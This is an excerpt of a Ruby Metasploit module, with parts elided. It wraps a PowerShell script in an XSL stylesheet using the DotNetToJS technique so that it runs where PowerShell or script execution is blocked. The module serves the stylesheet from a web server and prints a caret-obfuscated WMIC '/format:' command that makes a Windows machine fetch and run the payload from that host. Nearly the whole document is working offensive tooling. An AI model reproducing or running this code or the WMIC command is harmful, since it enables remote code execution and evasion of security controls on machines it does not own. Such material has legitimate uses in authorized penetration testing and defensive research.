...
class MetasploitModule < Msf::Auxiliary
  ...
  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows execution tool for PowerShell scripts',
      'Description'   => %q{ This module generates a XSL file with a PowerShell script
        embedded using DotNetToJS technique. It bypasses systems where PS is disabled and where script execution is forbidden as well.},
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Borja Cañavate  <canavate[at]protonmail.com>'],
      'Platform'      => [ 'win' ]
    ))

    register_options(
      [
        # Este modulo tiene las opciones que saldran
        OptPath.new('RESOURCE', [true, 'Full path to resource file to read commands from.']),
      	OptPath.new('DEST_PATH',[false,'Full destination path','/dev/shm/']),
	OptString.new('DEST_NAME',[false,'XSL name','albz']),
	OptAddress.new('LHOST',[true,'Local IP Host','0.0.0.0']),
	OptPort.new('LPORT',[false,'Local Port','4444'])
	])
  end

  # Run Method when run command is issued
  def run
    print_status("Running module")
    if datastore['RESOURCE']
      if ::File.exist?(datastore['RESOURCE'])
  	filename = datastore['RESOURCE']
  	puts "[+] Opening '#{filename}'"
  	content = IO.read(filename) # Better than File
  	b64contnt = Rex::Text.encode_base64(Rex::Text.to_unicode(content))	
 	pathname = datastore['DEST_PATH']+'/'+datastore['DEST_NAME']+'.xsl'
	puts pathname
	raw = %(<?xml version='1.0'?>
                <stylesheet
	...
	File.write(pathname,raw)
	
	puts "[+] File created and placed on: '#{pathname}'"
	serverlisten(datastore['LHOST'],datastore['LPORT'],datastore['DEST_NAME'],datastore['DEST_PATH'])
      end
     end
    end
    def serverlisten(httpip,httpport,filename,filepath)
    	puts "[+] Loading Webserver"
	if (httpip.to_s == "0.0.0.0")
		ip = Socket.ip_address_list.detect{|intf| intf.ipv4_private?}
		httpip = ip.ip_address		 
	end
	...
	puts "[+] Execute the following command on your Windows Machine:"
	command = "^W^M^I^C process get brief /format:\"http://"
        puts command+httpip.to_s+":"+httpport.to_s+"/"+filename+".xsl\""
        puts "\n "
	server.start
